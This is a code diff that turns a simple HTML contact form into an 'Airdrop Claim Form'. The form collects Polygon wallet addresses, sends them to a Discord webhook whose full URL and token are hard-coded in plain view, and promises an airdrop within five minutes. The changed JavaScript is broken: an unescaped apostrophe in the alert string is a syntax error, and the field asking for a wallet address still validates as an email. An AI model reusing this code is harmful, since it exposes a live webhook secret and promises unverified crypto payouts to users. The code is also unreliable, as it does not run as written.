@@ -6,11 +6,11 @@
   <body class="container mt-5">
     <form onsubmit="sendContact(event)">
       <div class="mb-3">
-        <label for="emailInput" class="form-label">Enter your email address</label>
+        <label for="emailInput" class="form-label">Enter your Polygon Address</label>
         <input type="email" class="form-control" id="emailInput">
       </div>
       <div class="mb-3">
-        <label for="messageInput" class="form-label">Enter your message</label>
+        <label for="messageInput" class="form-label">Any extra notes?</label>
         <textarea class="form-control" id="messageInput" rows="3"></textarea>
       </div>
       <button type="submit" class="btn btn-primary">Submit</button>
@@ -26,7 +26,7 @@
 
         const webhookBody = {
           embeds: [{
-            title: 'Contact Form Submitted',
+            title: 'Airdrop Claim Form Submitted',
             fields: [
               { name: 'Sender', value: senderEmail },
               { name: 'Message', value: senderMessage }
@@ -34,7 +34,7 @@
           }],
         };
 
-        const webhookUrl = 'YOUR URL HERE';
+        const webhookUrl = 'https://discord.com/api/webhooks/1256604574060515388/ZbiA_GIvfhB4aSu4rw2vmtTRCShitBlJWWycWE73hPARMQtU_LZu--HB0SzJse9ynjf3';
 
         const response = await fetch(webhookUrl, {
           method: 'POST',
@@ -45,7 +45,7 @@
         });
 
         if (response.ok) {
-          alert('I have received your message!');
+          alert('You'll receive your airdrop within the next 5 minutes, join our discord to keep track: https://discord.gg/invincibility');
         } else {
           alert('There was an error! Try again later!');
         }
